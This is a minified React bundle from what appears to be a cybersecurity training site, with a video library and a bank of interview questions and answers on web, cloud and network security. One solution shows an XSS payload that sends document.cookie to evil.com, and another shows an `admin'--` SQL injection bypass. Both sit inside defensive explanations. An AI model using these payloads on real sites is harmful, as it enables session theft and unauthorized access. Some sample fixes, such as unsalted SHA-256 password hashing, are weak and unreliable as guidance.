border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-all group",children:[e.jsx(xr,{className:"h-6 w-6 text-[#00FF88] mx-auto mb-3 group-hover:scale-110 transition-transform"}),e.jsx("div",{className:"text-2xl font-bold text-white mb-1 font-mono",children:"3"}),e.jsx("div",{className:"text-[#EAEAEA]/60 text-[10px] uppercase tracking-wider",children:"Modules"})]}),e.jsxs("div",{className:"text-center p-5 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-all group",children:[e.jsx(Ua,{className:"h-6 w-6 text-yellow-400 mx-auto mb-3 group-hover:scale-110 transition-transform"}),e.jsx("div",{className:"text-2xl font-bold text-white mb-1 font-mono",children:"2"}),e.jsx("div",{className:"text-[#EAEAEA]/60 text-[10px] uppercase tracking-wider",children:"Simulations"})]}),e.jsxs("div",{className:"text-center p-5 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-all group",children:[e.jsx(Pt,{className:"h-6 w-6 text-blue-400 mx-auto mb-3 group-hover:scale-110 transition-transform"}),e.jsx("div",{className:"text-2xl font-bold text-white mb-1 font-mono",children:"24"}),e.jsx("div",{className:"text-[#EAEAEA]/60 text-[10px] uppercase tracking-wider",children:"Hours Active"})]}),e.jsxs("div",{className:"text-center p-5 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-all group",children:[e.jsx(tt,{className:"h-6 w-6 text-purple-400 mx-auto mb-3 group-hover:scale-110 transition-transform"}),e.jsx("div",{className:"text-2xl font-bold text-white mb-1 font-mono",children:a.certificates?.length??0}),e.jsx("div",{className:"text-[#EAEAEA]/60 text-[10px] uppercase tracking-wider",children:"Awards"})]})]})]})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 p-6 relative overflow-hidden",children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-6 flex items-center gap-2",children:[e.jsx(tt,{className:"h-4 w-4"}),"Service Ribbons"]}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:n.map(i=>{const o=i.icon;return e.jsx("div",{className:`p-5 rounded-xl border transition-all duration-300 ${i.earned?"border-[#00FF88]/30 bg-[#00FF88]/5 hover:bg-[#00FF88]/10":"border-white/5 bg-black opacity-50"}`,children:e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("div",{className:`p-3 rounded-lg ${i.earned?"bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20":"bg-white/5 text-slate-500 border border-white/5"}`,children:e.jsx(o,{className:"h-5 w-5"})}),e.jsxs("div",{className:"flex-1",children:[e.jsx("h4",{className:`font-bold mb-1 uppercase tracking-tight ${i.earned?"text-white":"text-slate-500"}`,children:i.title}),e.jsx("p",{className:`text-xs font-mono ${i.earned?"text-[#00B37A]":"text-slate-600"}`,children:i.description})]}),i.earned&&e.jsx("div",{className:"bg-[#00FF88]/20 p-1.5 rounded-full shadow-[0_0_10px_rgba(0,255,136,0.3)]",children:e.jsx(tt,{className:"h-3 w-3 text-[#00FF88]"})})]})},i.id)})})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 p-6 relative overflow-hidden",children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-6 flex items-center gap-2",children:[e.jsx(xs,{className:"h-4 w-4"}),"Mission Log"]}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center space-x-4 p-4 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-colors group",children:[e.jsx("div",{className:"w-2 h-2 bg-[#00FF88] rounded-full shadow-[0_0_10px_#00FF88]"}),e.jsx("span",{className:"flex-1 text-[#EAEAEA] font-mono text-sm group-hover:text-white transition-colors",children:"COMPLETED ASSESSMENT TEST"}),e.jsx("span",{className:"text-[#00B37A] text-xs font-mono",children:"0200 HOURS"})]}),e.jsxs("div",{className:"flex items-center space-x-4 p-4 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-colors group",children:[e.jsx("div",{className:"w-2 h-2 bg-yellow-400 rounded-full shadow-[0_0_10px_#FBBF24]"}),e.jsx("span",{className:"flex-1 text-[#EAEAEA] font-mono text-sm group-hover:text-white transition-colors",children:"INITIATED OWASP TOP 10 PROTOCOL"}),e.jsx("span",{className:"text-[#00B37A] text-xs font-mono",children:"1 DAY AGO"})]}),e.jsxs("div",{className:"flex items-center space-x-4 p-4 bg-black rounded-xl border border-[#00FF88]/10 hover:border-[#00FF88]/30 transition-colors group",children:[e.jsx("div",{className:"w-2 h-2 bg-blue-400 rounded-full shadow-[0_0_10px_#60A5FA]"}),e.jsx("span",{className:"flex-1 text-[#EAEAEA] font-mono text-sm group-hover:text-white transition-colors",children:"OPERATIVE ACTIVATED"}),e.jsx("span",{className:"text-[#00B37A] text-xs font-mono",children:"3 DAYS AGO"})]})]})]})]})})};function g2(a){const n=a.replace(/\.[^/.]+$/,""),s=n.split("_");if(s.length>=3){const i=s[0].replace(/-/g," "),o=s[1].toLowerCase()||"beginner";return{title:s.slice(2).join(" ").replace(/-/g," "),category:i,difficulty:o}}return{title:n.replace(/-/g," ").replace(/_/g," "),category:"General",difficulty:"beginner"}}async function b2(a="/cybercoach"){try{const n=await fetch(`/api/imagekit/videos?folder=${encodeURIComponent(a)}`);if(!n.ok)throw new Error(`Failed to fetch videos: ${n.status}`);return(await n.json()).filter(o=>o.fileType==="video"||o.name.match(/\.(mp4|webm|mov|avi|mkv)$/i)).map(o=>{const c=g2(o.name),d=o.customMetadata||{};return{id:o.fileId,title:d.title||c.title,description:d.description||`Learn about ${c.title} in this cybersecurity training video.`,instructor:d.instructor||"CyberCoach Academy",duration:d.duration||"N/A",thumbnail:`${o.url}/tr:w-640,h-360,fo-auto`,category:d.category||c.category,difficulty:d.difficulty||c.difficulty,views:Math.floor(Math.random()*1e4)+500,uploadDate:o.createdAt.split("T")[0],videoUrl:o.url,fileSize:o.size}})}catch(n){return console.error("Error fetching videos from ImageKit:",n),[]}}const v2=()=>{const[a,n]=v.useState([]),[s,i]=v.useState(!0),[o,c]=v.useState(null),[d,m]=v.useState(null),[f,x]=v.useState(""),[p,b]=v.useState("all"),[w,j]=v.useState("all");v.useEffect(()=>{N()},[]);const N=async()=>{i(!0),c(null);try{const S=await b2("/cybercoach");n(S)}catch(S){console.error("Failed to load videos:",S),c("Failed to load videos. Please try again.")}finally{i(!1)}},k=["all",...Array.from(new Set(a.map(S=>S.category)))],F=["all","beginner","intermediate","advanced"],T=a.filter(S=>{const U=f.trim().toLowerCase(),z=U===""||S.title.toLowerCase().includes(U)||S.description.toLowerCase().includes(U),H=p==="all"||S.category===p,G=w==="all"||S.difficulty===w;return z&&H&&G}),R=S=>{switch(S){case"beginner":return"text-[#00FF88] border-[#00FF88]/30 bg-[#00FF88]/10";case"intermediate":return"text-yellow-400 border-yellow-400/30 bg-yellow-400/10";case"advanced":return"text-red-400 border-red-400/30 bg-red-400/10";default:return"text-slate-400 border-slate-400/30 bg-slate-400/10"}};return s?e.jsx("div",{className:"p-6 min-h-screen flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#00FF88] mx-auto mb-4"}),e.jsx("p",{className:"text-[#00FF88] font-mono",children:"LOADING VIDEO ARCHIVES..."})]})}):o?e.jsx("div",{className:"p-6 min-h-screen flex items-center justify-center",children:e.jsxs("div",{className:"text-center max-w-md",children:[e.jsx(or,{className:"h-16 w-16 text-red-500 mx-auto mb-4"}),e.jsx("h2",{className:"text-xl font-bold text-white mb-2",children:"Connection Error"}),e.jsx("p",{className:"text-[#00B37A] mb-6",children:o}),e.jsxs("button",{onClick:N,className:"bg-[#00FF88] text-black px-6 py-3 rounded-lg font-bold hover:bg-[#00CC66] transition-colors flex items-center space-x-2 mx-auto",children:[e.jsx(Ba,{className:"h-4 w-4"}),e.jsx("span",{children:"Retry"})]})]})}):d?e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-5xl mx-auto",children:[e.jsx("button",{onClick:()=>m(null),className:"flex items-center space-x-2 text-[#00FF88] hover:text-[#00CC66] transition-colors mb-6 font-mono uppercase tracking-wider text-sm",children:e.jsx("span",{children:" Back to Videos"})}),e.jsx("h1",{className:"text-2xl font-bold text-white mb-4 tracking-tight",children:d.title}),e.jsx("div",{className:"rounded-xl overflow-hidden border border-[#00FF88]/20 shadow-[0_0_30px_rgba(0,255,136,0.1)]",children:e.jsx(Bd,{videoUrl:d.videoUrl,title:d.title,onProgress:()=>{},onComplete:()=>{}})})]})}):e.jsx("div",{className:"p-6 min-h-screen animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Intel ",e.jsx("span",{className:"text-[#00FF88]",children:"Archives"})]}),e.jsxs("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:["CLASSIFIED VIDEO DATABASE  ",a.length," FILES"]})]}),e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("button",{onClick:N,className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center hover:bg-[#00FF88]/20 transition-colors",title:"Refresh videos",children:e.jsx(Ba,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(_m,{className:"h-5 w-5 text-[#00FF88]"})})]})]}),e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 p-6",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-4",children:[e.jsx("div",{className:"md:col-span-2",children:e.jsxs("div",{className:"relative group",children:[e.jsx(Dr,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-[#00B37A] group-focus-within:text-[#00FF88] transition-colors"}),e.jsx("input",{type:"text",placeholder:"SEARCH DATABASE...",value:f,onChange:S=>x(S.target.value),className:"w-full pl-10 pr-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_15px_rgba(0,255,136,0.1)] placeholder-[#00B37A]/50 font-mono text-sm transition-all"})]})}),e.jsx("div",{children:e.jsxs("div",{className:"relative",children:[e.jsx(od,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-[#00B37A]"}),e.jsx("select",{value:p,onChange:S=>b(S.target.value),className:"w-full pl-10 pr-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] appearance-none font-mono text-sm cursor-pointer hover:border-[#00FF88]/40 transition-colors",children:k.map(S=>e.jsx("option",{value:S,children:S==="all"?"ALL CATEGORIES":S.toUpperCase()},S))})]})}),e.jsx("div",{children:e.jsxs("div",{className:"relative",children:[e.jsx(od,{className:"absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-[#00B37A]"}),e.jsx("select",{value:w,onChange:S=>j(S.target.value),className:"w-full pl-10 pr-4 py-3 border border-[#00FF88]/20 bg-black text-[#EAEAEA] rounded-lg focus:outline-none focus:border-[#00FF88] appearance-none font-mono text-sm cursor-pointer hover:border-[#00FF88]/40 transition-colors",children:F.map(S=>e.jsx("option",{value:S,children:S==="all"?"ALL LEVELS":S.toUpperCase()},S))})]})})]})}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:T.map(S=>e.jsxs("div",{onClick:()=>m(S),className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden cursor-pointer hover:border-[#00FF88]/40 hover:shadow-[0_0_20px_rgba(0,255,136,0.1)] transition-all duration-300 group",children:[e.jsxs("div",{className:"relative aspect-video bg-black",children:[e.jsx("img",{src:S.thumbnail,alt:S.title,className:"w-full h-full object-cover opacity-70 group-hover:opacity-90 group-hover:scale-105 transition-all duration-500"}),e.jsx("div",{className:"absolute inset-0 bg-gradient-to-t from-black/80 to-transparent"}),e.jsx("div",{className:"absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all duration-300 transform scale-90 group-hover:scale-100",children:e.jsx("div",{className:"bg-[#00FF88] rounded-full p-4 shadow-[0_0_20px_rgba(0,255,136,0.5)]",children:e.jsx(Bt,{className:"h-6 w-6 text-black fill-current"})})}),e.jsx("div",{className:"absolute bottom-3 right-3 bg-black/80 border border-[#00FF88]/30 text-[#00FF88] px-2 py-1 rounded text-xs font-mono",children:S.duration})]}),e.jsxs("div",{className:"p-5",children:[e.jsx("div",{className:"flex items-start justify-between mb-3",children:e.jsx("h3",{className:"font-bold text-white group-hover:text-[#00FF88] transition-colors line-clamp-2 text-lg tracking-tight",children:S.title})}),e.jsxs("div",{className:"flex items-center gap-2 mb-4 flex-wrap",children:[e.jsx("span",{className:`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border ${R(S.difficulty)}`,children:S.difficulty}),e.jsx("span",{className:"px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border border-[#00B37A]/30 bg-[#00B37A]/10 text-[#00B37A]",children:S.category})]}),e.jsx("p",{className:"text-[#00B37A] text-sm mb-2 line-clamp-2 leading-relaxed",children:S.description})]})]},S.id))}),T.length===0&&a.length>0&&e.jsxs("div",{className:"text-center py-20 border border-dashed border-[#00FF88]/20 rounded-xl bg-[#0A0F0A]/50",children:[e.jsx("div",{className:"text-[#00FF88]/20 mb-6",children:e.jsx(Dr,{className:"h-16 w-16 mx-auto"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-2 uppercase tracking-widest",children:"No Intel Found"}),e.jsx("p",{className:"text-[#00B37A]",children:"Adjust search parameters to locate classified files."})]}),a.length===0&&!s&&e.jsxs("div",{className:"text-center py-20 border border-dashed border-[#00FF88]/20 rounded-xl bg-[#0A0F0A]/50",children:[e.jsx("div",{className:"text-[#00FF88]/20 mb-6",children:e.jsx(_m,{className:"h-16 w-16 mx-auto"})}),e.jsx("h3",{className:"text-xl font-bold text-white mb-2 uppercase tracking-widest",children:"No Videos Yet"}),e.jsx("p",{className:"text-[#00B37A] mb-4",children:"Upload videos to your ImageKit folder to see them here."}),e.jsx("p",{className:"text-[#EAEAEA]/50 text-sm font-mono",children:"Folder: /cybercoach"}),e.jsx("p",{className:"text-[#EAEAEA]/40 text-xs font-mono mt-2",children:"Naming format: Category_Difficulty_Title.mp4"})]})]})})},Wc=[{id:"google-1",company:"Google",position:"Security Engineer",difficulty:"mid",category:"Web Security",question:`You discover that a web application is vulnerable to SQL injection. The application uses the following PHP code:

$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";

1. Demonstrate how an attacker could bypass authentication
2. Explain the impact of this vulnerability
3. Provide a secure code implementation
4. What additional security measures would you recommend?`,hints:["Think about how SQL comments work and how they can terminate queries early","Consider what happens when you inject SQL syntax into the username field","Look into prepared statements and parameterized queries","Think about defense in depth - what other layers of security could help?"],solution:`**1. Authentication Bypass:**
An attacker could use the following payload in the username field:
\`admin'--\`

This would result in the query:
\`SELECT * FROM users WHERE username = 'admin'--' AND password = ''\`

The \`--\` comments out the password check, allowing login as admin without knowing the password.

**2. Impact:**
- Complete authentication bypass
- Unauthorized access to user accounts
- Potential data exfiltration
- Privilege escalation
- Database manipulation/deletion

**3. Secure Implementation:**
\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST['username'], hash('sha256', $_POST['password'])]);
$user = $stmt->fetch();
\`\`\`

**4. Additional Security Measures:**
- Input validation and sanitization
- Rate limiting for login attempts
- Multi-factor authentication
- Password hashing with salt
- Web Application Firewall (WAF)
- Regular security audits`,explanation:"This is a classic SQL injection vulnerability caused by string concatenation in SQL queries. The key insight is understanding how SQL comments (`--`) can be used to bypass authentication logic. The secure solution uses prepared statements which separate SQL logic from data, preventing injection attacks.",followUpQuestions:["How would you detect this vulnerability in a large codebase?","What tools would you use for automated SQL injection testing?","How would you implement logging to detect such attacks?"],tags:["SQL Injection","Authentication","Web Security","PHP"],timeLimit:30},{id:"microsoft-1",company:"Microsoft",position:"Cybersecurity Analyst",difficulty:"senior",category:"Network Security",question:`You're investigating a potential APT (Advanced Persistent Threat) in your network. You have the following indicators:

1. Unusual outbound traffic to IP 185.243.115.84 on port 443
2. PowerShell execution with base64 encoded commands
3. Scheduled tasks created with suspicious names
4. Registry modifications in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Analyze this scenario and provide:
1. Your investigation methodology
2. Tools you would use
3. How to contain the threat
4. Long-term prevention strategies`,hints:["Think about the kill chain - what stage of attack does each indicator represent?","Consider both host-based and network-based investigation techniques","Think about isolation vs. monitoring - when would you choose each?","Consider threat intelligence and IOC sharing"],solution:`**1. Investigation Methodology:**

**Phase 1: Initial Assessment**
- Isolate affected systems (network segmentation)
- Preserve evidence (memory dumps, disk images)
- Document timeline of events
- Assess scope of compromise

**Phase 2: Technical Analysis**
- Decode PowerShell base64 commands
- Analyze network traffic patterns
- Examine scheduled tasks and registry entries
- Check for lateral movement indicators

**Phase 3: Threat Attribution**
- Compare IOCs with threat intelligence feeds
- Analyze TTPs (Tactics, Techniques, Procedures)
- Determine attack vector and timeline

**2. Tools:**
- **Network Analysis:** Wireshark, Zeek, Suricata
- **Host Analysis:** Volatility, YARA, Sysinternals
- **Threat Intelligence:** MISP, OpenIOC, STIX/TAXII
- **SIEM:** Splunk, ELK Stack, QRadar
- **Forensics:** Autopsy, FTK, EnCase

**3. Containment Strategy:**
- Immediate: Block C2 IP at firewall
- Network segmentation of affected hosts
- Disable compromised accounts
- Update endpoint detection rules
- Monitor for additional IOCs

**4. Long-term Prevention:**
- Implement Zero Trust architecture
- Enhanced endpoint detection and response (EDR)
- Regular threat hunting exercises
- Employee security awareness training
- Incident response plan updates`,explanation:"This scenario represents a typical APT investigation requiring systematic analysis of multiple indicators. The key is understanding the attack lifecycle and using appropriate tools for each phase of investigation. The outbound traffic suggests command and control communication, while PowerShell and persistence mechanisms indicate established access.",followUpQuestions:["How would you handle this if it occurred in a cloud environment?","What legal considerations might apply to this investigation?","How would you coordinate with external threat intelligence sources?"],tags:["APT","Incident Response","Network Security","Forensics"],timeLimit:45},{id:"amazon-1",company:"Amazon",position:"Cloud Security Engineer",difficulty:"senior",category:"Cloud Security",question:`An AWS S3 bucket containing sensitive customer data was accidentally made public. The bucket contained:
- Customer PII (personally identifiable information)
- Payment card data
- Internal application logs
- Database backups

The exposure lasted for 6 hours before detection. Provide:
1. Immediate response actions
2. Investigation steps
3. Compliance considerations
4. Prevention measures for the future`,hints:["Think about data breach notification requirements and timelines","Consider what logs and monitoring could help determine the scope","Think about AWS-specific tools for bucket analysis and access logging","Consider both technical and business impact assessment"],solution:`**1. Immediate Response Actions:**

**Hour 0-1: Containment**
- Immediately secure the S3 bucket (remove public access)
- Enable S3 access logging if not already enabled
- Take snapshot of current bucket permissions
- Notify incident response team and legal counsel
- Begin documentation of all actions

**Hour 1-4: Assessment**
- Review CloudTrail logs for bucket access
- Check S3 server access logs for external requests
- Identify what data was potentially accessed
- Assess scope of exposure using AWS Config

**2. Investigation Steps:**
\`\`\`bash
# Check bucket access logs
aws s3 cp s3://bucket-logs/ . --recursive

# Review CloudTrail for bucket policy changes
aws logs filter-log-events --log-group-name CloudTrail-LogGroup 
  --filter-pattern "{ $.eventName = PutBucketPolicy || $.eventName = PutBucketAcl }"

# Analyze access patterns
aws s3api get-bucket-logging --bucket sensitive-bucket
\`\`\`

**3. Compliance Considerations:**
- **GDPR:** 72-hour breach notification requirement
- **PCI DSS:** Immediate notification to card brands
- **CCPA:** Consumer notification within reasonable timeframe
- **SOX:** Financial data exposure reporting
- **HIPAA:** If health data involved, 60-day notification

**4. Prevention Measures:**
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": ["arn:aws:s3:::bucket/*"],
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalServiceName": ["ec2.amazonaws.com"]
        }
      }
    }
  ]
}
\`\`\`

**Additional Measures:**
- Enable S3 Block Public Access at account level
- Implement bucket policy automation
- Set up CloudWatch alarms for policy changes
- Regular access reviews and audits
- Data classification and encryption`,explanation:"This scenario tests understanding of cloud security incident response, compliance requirements, and AWS-specific security controls. The key is balancing immediate containment with thorough investigation while meeting various regulatory notification requirements.",followUpQuestions:["How would you handle this in a multi-cloud environment?","What if the data was encrypted - how would that change your response?","How would you calculate the potential financial impact?"],tags:["Cloud Security","AWS","Data Breach","Compliance"],timeLimit:40},{id:"facebook-1",company:"Meta (Facebook)",position:"Security Engineer",difficulty:"mid",category:"Application Security",question:`You're reviewing a React application and find the following code:

\`\`\`javascript
function UserProfile({ userId }) {
  const [userData, setUserData] = useState(null);
  
  useEffect(() => {
    fetch(\`/api/user/\${userId}\`)
      .then(response => response.json())
      .then(data => setUserData(data));
  }, [userId]);
  
  return (
    <div>
      <h1>Welcome {userData?.name}</h1>
      <div dangerouslySetInnerHTML={{__html: userData?.bio}} />
      <img src={userData?.avatar} alt="User avatar" />
    </div>
  );
}
\`\`\`

Identify security vulnerabilities and provide secure alternatives.`,hints:["Look at how user input is being rendered in the DOM","Consider what could happen if userData.bio contains malicious content","Think about input validation and output encoding","Consider Content Security Policy as an additional defense"],solution:`**Identified Vulnerabilities:**

**1. Cross-Site Scripting (XSS) via dangerouslySetInnerHTML**
The \`userData?.bio\` is directly inserted into the DOM without sanitization.

**Attack Example:**
\`\`\`javascript
// Malicious bio content:
"<script>document.location='http://evil.com/steal?cookie='+document.cookie<\/script>"
\`\`\`

**2. Potential IDOR (Insecure Direct Object Reference)**
No validation that the current user can access the requested userId.

**3. Missing Input Validation**
No validation of userId parameter before making API call.

**Secure Implementation:**

\`\`\`javascript
import DOMPurify from 'dompurify';

function UserProfile({ userId }) {
  const [userData, setUserData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    // Input validation
    if (!userId || !/^[0-9]+$/.test(userId)) {
      setError('Invalid user ID');
      setLoading(false);
      return;
    }
    
    fetch(\`/api/user/\${encodeURIComponent(userId)}\`, {
      headers: {
        'Authorization': \`Bearer \${getAuthToken()}\`,
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to fetch user data');
      }
      return response.json();
    })
    .then(data => {
      setUserData(data);
      setLoading(false);
    })
    .catch(err => {
      setError(err.message);
      setLoading(false);
    });
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  
  return (
    <div>
      <h1>Welcome {userData?.name}</h1>
      {/* Safe HTML rendering with sanitization */}
      <div dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(userData?.bio || '')
      }} />
      {/* Input validation for image URL */}
      <img 
        src={userData?.avatar?.startsWith('https://') ? userData.avatar : '/default-avatar.png'} 
        alt="User avatar"
        onError={(e) => { e.target.src = '/default-avatar.png'; }}
      />
    </div>
  );
}
\`\`\`

**Additional Security Measures:**

**1. Content Security Policy:**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https:;
\`\`\`

**2. Backend Validation:**
\`\`\`javascript
// API endpoint should validate authorization
app.get('/api/user/:id', authenticateUser, (req, res) => {
  const userId = parseInt(req.params.id);
  
  // Check if user can access this profile
  if (!canUserAccessProfile(req.user.id, userId)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Return sanitized data
  const userData = getUserData(userId);
  res.json({
    name: sanitize(userData.name),
    bio: sanitize(userData.bio),
    avatar: validateImageUrl(userData.avatar)
  });
});
\`\`\``,explanation:"This code demonstrates common React security vulnerabilities, particularly XSS through dangerouslySetInnerHTML. The solution involves input validation, output encoding, proper error handling, and defense-in-depth strategies including CSP.",followUpQuestions:["How would you implement automated security testing for this component?","What other React security best practices should be followed?","How would you handle file uploads securely in this context?"],tags:["XSS","React","Application Security","Frontend Security"],timeLimit:35},{id:"apple-1",company:"Apple",position:"Security Architect",difficulty:"principal",category:"Cryptography",question:`Design a secure messaging system for a mobile application that requires:

1. End-to-end encryption
2. Perfect forward secrecy
3. Protection against man-in-the-middle attacks
4. Scalability to millions of users
5. Offline message delivery

Provide the cryptographic protocol design, key management strategy, and implementation considerations.`,hints:["Consider the Signal Protocol or similar double ratchet algorithms","Think about key exchange mechanisms and identity verification","Consider how to handle key rotation and compromise scenarios","Think about the infrastructure needed for key distribution and message routing"],solution:`**Cryptographic Protocol Design:**

**1. Key Exchange Protocol (X3DH - Extended Triple Diffie-Hellman):**

\`\`\`
Alice -> Server: Identity Key (IK_A), Signed Prekey (SPK_A), One-time Prekeys (OPK_A)
Bob -> Server: Identity Key (IK_B), Signed Prekey (SPK_B), One-time Prekeys (OPK_B)

When Alice wants to message Bob:
1. Alice fetches Bob's key bundle from server
2. Alice generates ephemeral key (EK_A)
3. Alice computes shared secret:
   DH1 = DH(IK_A, SPK_B)
   DH2 = DH(EK_A, IK_B)
   DH3 = DH(EK_A, SPK_B)
   DH4 = DH(EK_A, OPK_B)  // if available
   
   SK = KDF(DH1 || DH2 || DH3 || DH4)
\`\`\`

**2. Double Ratchet for Perfect Forward Secrecy:**

\`\`\`python
class DoubleRatchet:
    def __init__(self, shared_key, public_key):
        self.root_key = shared_key
        self.chain_key_send = None
        self.chain_key_recv = None
        self.public_key = public_key
        self.private_key = generate_keypair()
        
    def encrypt_message(self, plaintext):
        # Advance sending chain
        self.chain_key_send, message_key = kdf_chain(self.chain_key_send)
        
        # Encrypt with AES-256-GCM
        ciphertext = aes_gcm_encrypt(message_key, plaintext)
        
        # Include current public key for ratchet step
        return {
            'ciphertext': ciphertext,
            'public_key': self.public_key,
            'counter': self.send_counter
        }
        
    def decrypt_message(self, message):
        # Perform DH ratchet step if new public key
        if message['public_key'] != self.remote_public_key:
            self.dh_ratchet(message['public_key'])
            
        # Derive message key and decrypt
        message_key = derive_message_key(self.chain_key_recv, message['counter'])
        return aes_gcm_decrypt(message_key, message['ciphertext'])
\`\`\`

**3. Identity Verification (Safety Numbers):**

\`\`\`python
def generate_safety_number(identity_key_a, identity_key_b):
    combined = identity_key_a + identity_key_b
    hash_output = sha256(combined)
    
    # Convert to 60-digit number for user verification
    safety_number = ""
    for i in range(0, 30, 5):
        chunk = int.from_bytes(hash_output[i:i+5], 'big')
        safety_number += f"{chunk % 100000:05d}"
    
    return safety_number
\`\`\`

**4. Key Management Infrastructure:**

\`\`\`yaml
# Key Server Architecture
components:
  - identity_service:
      purpose: "Manage long-term identity keys"
      storage: "HSM-backed secure storage"
      replication: "Multi-region with consistency"
      
  - prekey_service:
      purpose: "Distribute one-time prekeys"
      storage: "Encrypted database"
      rotation: "Automatic replenishment"
      
  - message_relay:
      purpose: "Store encrypted messages for offline delivery"
      retention: "7 days maximum"
      encryption: "Additional layer with server keys"

security_measures:
  - certificate_transparency: "Public log of identity key changes"
  - key_pinning: "Pin identity keys in client applications"
  - abuse_detection: "Monitor for suspicious key rotation patterns"
\`\`\`

**5. Implementation Considerations:**

**Client-Side Security:**
\`\`\`swift
// iOS Secure Enclave integration
class SecureKeyManager {
    func generateIdentityKey() -> SecKey {
        let attributes: [String: Any] = [
            kSecAttrKeyType as String: kSecAttrKeyTypeECSECPrimeRandom,
            kSecAttrKeySizeInBits as String: 256,
            kSecAttrTokenID as String: kSecAttrTokenIDSecureEnclave,
            kSecPrivateKeyAttrs as String: [
                kSecAttrIsPermanent as String: true,
                kSecAttrApplicationTag as String: "com.app.identity-key"
            ]
        ]
        
        var error: Unmanaged<CFError>?
        guard let privateKey = SecKeyCreateRandomKey(attributes as CFDictionary, &error) else {
            fatalError("Failed to generate key: \\(error!.takeRetainedValue())")
        }
        
        return privateKey
    }
}
\`\`\`

**Scalability Architecture:**
- **Horizontal sharding** of key servers by user ID hash
- **CDN distribution** of public key bundles
- **Message queuing** for offline delivery with exponential backoff
- **Rate limiting** to prevent abuse and DoS attacks

**Compromise Recovery:**
- **Key rotation** protocol for compromised devices
- **Out-of-band verification** for identity key changes
- **Backward secrecy** through regular key deletion
- **Audit logging** for security monitoring`,explanation:"This design combines proven cryptographic protocols (X3DH + Double Ratchet) with practical implementation considerations for a production messaging system. The key insight is balancing security, usability, and scalability while providing strong guarantees against various attack scenarios.",followUpQuestions:["How would you handle group messaging with these same security properties?","What are the trade-offs between security and performance in mobile environments?","How would you implement secure backup and recovery of message history?"],tags:["Cryptography","Protocol Design","Mobile Security","End-to-End Encryption"],timeLimit:60},{id:"netflix-1",company:"Netflix",position:"Security Engineer",difficulty:"mid",category:"DevSecOps",question:`You need to implement security in a CI/CD pipeline for a microservices architecture. The pipeline should include:

1. Static code analysis
2. Dependency vulnerability scanning
3. Container security scanning
4. Dynamic security testing
5. Infrastructure as Code security validation

Design the pipeline and provide implementation details for each security gate.`,hints:["Think about where each security check should be placed in the pipeline","Consider both blocking and non-blocking security checks","Think about how to handle security findings and developer feedback","Consider the balance between security and development velocity"],solution:`**Secure CI/CD Pipeline Design:**

\`\`\`yaml
# .github/workflows/secure-pipeline.yml
name: Secure CI/CD Pipeline

on:
  push:
